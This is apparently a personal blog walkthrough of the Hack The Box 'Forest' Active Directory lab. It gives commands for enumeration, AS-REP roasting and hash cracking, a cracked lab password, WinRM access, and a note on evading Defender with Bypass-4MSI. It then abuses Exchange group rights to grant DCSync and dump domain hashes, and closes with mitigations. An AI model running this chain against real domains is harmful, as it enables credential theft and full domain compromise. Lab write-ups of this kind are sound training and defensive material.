---
title: Forest
date: 2025-05-02
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, AS-REP, WriteDACL, DCSync ] 
image: forest.png
media_subpath: /assets/img/posts/2025-05-02-forestHTB/
---

## Introduction

In this walkthrough, I targeted a Windows Domain Controller named **Forest**, which was categorized as an easy-level machine. The domain had **Microsoft Exchange Server** installed. I began by enumerating target SMB, LDAP services after that I searched for AS-REP Roastable users. During enumeration, I identified a **service account** that had **Kerberos pre-authentication disabled**, enabling me to extract its TGT and **brute-force the password offline**. With access to this account, I discovered it was a member of the **Account Operators** group. Leveraging this, I added a new user to the **Exchange Windows Permissions** group. Due to a known misconfiguration in Exchange, this group membership allowed me to gain **DCSync privileges**, enabling me to dump **NTLM password hashes** from the domain controller. Let's start ..

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 53 (DNS)

Version: Simple DNS Plus

Domain: **htb.local**

- **dig any DNS records**
    
    ```bash
    dig any htb.local @$IP
    ```
    
    ![image.png](image%202.png)
    
- **Zone Transfer**
    
    ```bash
    dig axfr @$IP htb.local
    ```
    
    ![image.png](image%203.png)
    

### Port 139/445 (SMB,RPC)

- **smbclient**
    
    ```bash
    smbclient -L //$IP/ -N
    ```
    
    ![image.png](image%204.png)
    
- **enum4linux**
    
    ```bash
    enum4linux $IP
    ```
    
    ```bash
    user:[sebastien] rid:[0x479]
    user:[lucinda] rid:[0x47a]
    user:[svc-alfresco] rid:[0x47b]
    user:[andy] rid:[0x47e]
    user:[mark] rid:[0x47f]
    user:[santi] rid:[0x480]
    ```
    

### Port 5985 (WinRM)

## Web

…

## AD Initial Enumeration

### Port 389/3268 (LDAP)

```bash
ldapsearch -H ldap://$IP -x -s base -b '' "(objectClass=*)" "*" +
```

Nothing interesting.

## Initial Attack Vectors

### LLMNR Poisoning

```bash
sudo responder -I <interface> -dwv 
```

I waited a bit but nothing returned.

### AS-REP Roasting

```bash
GetNPUsers.py htb.local/ -dc-ip $IP -no-pass -usersfile users
```

![image.png](image%205.png)

```bash
hashcat -m 18200 svc-alfresco.hash /usr/share/wordlists/rockyou.txt --force
```

![image.png](image%206.png)

## Credentials

```bash
svc-alfresco : s3rvice
```

Let’s try the user password with evil-winrm:

```bash
evil-winrm -i $IP -u svc-alfresco -p s3rvice
```

As I am a service account I checked for my privileges, but I don’t have much privileges.

![image.png](image%207.png)

We have another user `sebastien` most probably we should lateral move.

## Lateral Movement

I used the same password for `sebastien` but coudn’t login.

Let’s perform enumeration using BloodHound.

```bash
.\SharpHound.exe -c All --zipfilename forestAD
```

```bash
sudo neo4j start
bloodhound
```

- **RBCD**
    
    From BloodHound graph I see:
    
    We have `GenericAll` privileges over Computer, that means we can perform Resource Based Constrained Delegation attack. 
    
    But it failed in the second step with insufficient rights error:
    
    ```bash
    impacket-addcomputer -computer-name 'RBCD$' -computer-pass 'Summer2018!'  -dc-ip $IP  'htb.local/svc-alfresco:s3rvice’
    ```
    
    ![image.png](image%208.png)
    
    ```bash
    impacket-rbcd -delegate-from 'RBCD$' -delegate-to 'FOREST$' -dc-ip $IP -action 'write' 'htb.local/svc-alfresco:s3rvice’
    ```
    
    ![image.png](image%209.png)
    
- **Kerberoasting**
    
    ```bash
    GetUserSPNs.py -dc-ip $IP htb.local/svc-alfresco
    ```
    
    ![image.png](image%2010.png)
    
- **HasSession**
    
    I see from BloodHound that Administrator user has session on the computer that I am logged in that means we can try to get their credentials
    
    ![image.png](image%2011.png)
    
    But we are not an admin to run mimikatz.
    
- **WriteDACL**
    
    ![image.png](image%2012.png)
    
    As you can see from the image our user is the member of Account Operators which has generic all privileges over Exchange Windows Permissions which has WriteDACL privileges over domain.
    
    Let’s add a new user to `EXCHANGE WINDOWS PERMISSIONS` group with PowerView.ps1 before importing PowerView.ps1 it is good practice to run `Bypass-4MSI` to evade defender.
    
    ![image.png](image%2013.png)
    
    I added a new user  to `EXCHANGE WINDOWS PERMISSIONS` group so that using that user I could perform DCSync attack:
    
    ```powershell
    net user kh4n password /add /domain
    net group "Exchange Windows Permissions" kh4n /add
    ```
    
    Now let’s grant ourselves DCSync privileges over domain:
    
    ```powershell
    $SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('htb\kh4n', $SecPassword)
    Add-DomainObjectAcl -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity 'kh4n' -Rights DCSync -Verbose -Credential $Cred
    ```
    
    [DCSync AD](https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Domain-Privilege-Escalation.md#permissions-on-domain-object)
    
    ```powershell
    secretsdump.py -just-dc htb/kh4n@$IP
    ```
    

After Obtaining Administrator hash we can use impacket-psexec to get a shell as nt authority\system.

Alternatively we could add ourselves to `EXCHANGE WINDOWS PERMISSIONS` group and grant ourselves DCSync privileges, but after I added myself to that group I run the following and it just hangs there.

```powershell
net group "Exchange Windows Permissions" svc-alfresco /add
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members 'svc-alfresco'
Add-DomainObjectAcl -TargetIdentity htb.local -Rights DCSync
```

> When adding an *existing user* to a new privileged group (e.g., "Exchange Windows Permissions"), the current session **won’t immediately inherit** the new rights—the user must **re-login** or generate a fresh token (**`klist purge`** + **`runas`**). However, a *newly created user* added to the group **gets the rights instantly** because its initial token includes updated memberships. Always verify with **`whoami /groups`**.
{: .prompt-warning }

As you can see I am not in that group at all but I was.

![image.png](image%2014.png)

Either we should relogin or use `runas`.

## Mitigation

- **Disable Anonymous LDAP Binds**: Configure the domain controller to reject anonymous LDAP binds to prevent unauthenticated enumeration of directory objects.
- **Enforce Kerberos Pre-authentication**: Ensure all domain accounts, especially service accounts, require Kerberos pre-authentication to prevent offline brute-force attacks.
- **Restrict Account Operators Group**: Limit membership of the `Account Operators` group and regularly audit it for unauthorized access.
- **Audit Exchange Group Permissions**: Understand and restrict the implications of groups like `Exchange Windows Permissions`, which can indirectly grant DCSync rights.
- **Monitor DCSync Activity**: Enable auditing for directory replication activities using Event IDs like `4662` and tools like **Sysmon**, **Azure Sentinel**, or **ELK Stack**.
